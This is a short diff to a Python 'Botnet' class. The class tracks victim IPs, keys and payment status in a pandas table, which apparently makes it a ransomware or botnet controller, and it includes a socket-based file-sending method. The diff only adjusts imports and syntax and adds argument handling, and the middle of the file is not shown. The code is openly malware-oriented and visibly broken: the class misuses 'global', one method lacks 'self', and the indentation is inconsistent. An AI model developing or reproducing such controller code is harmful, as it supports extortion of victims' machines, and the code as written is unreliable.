@@ -1,15 +1,15 @@
 import socket
 import os
 import sys
-import thread
+import _thread
 import pandas as pd
-#Function to TL;DR sends a file lmao
+
 class Botnet(object):
-	global 
+	global df
 	def __init__(self, input_botnet = None):		
 		if input_botnet is None:
 			df = pd.DataFrame(columns = ["ip", "key" , "paymentstat"])
-   		else:
+		else:
    			df = pd.read_csv(input_botnet)
 	def send_file(file_name, host, port):
 	        s = socket.socket()
@@ -63,4 +63,12 @@ class Botnet(object):
 
 
 if __name__ == '__main__':
+	if len(sys.argv) == 1:
+		print("no arg")
 		Botnet.Main()
+	elif len(sys.argv) > 2:
+		print("usage error")
+	else:
+		print("correct")
+		Botnet(sys.argv[1]).Main()
+	#Botnet.Main()
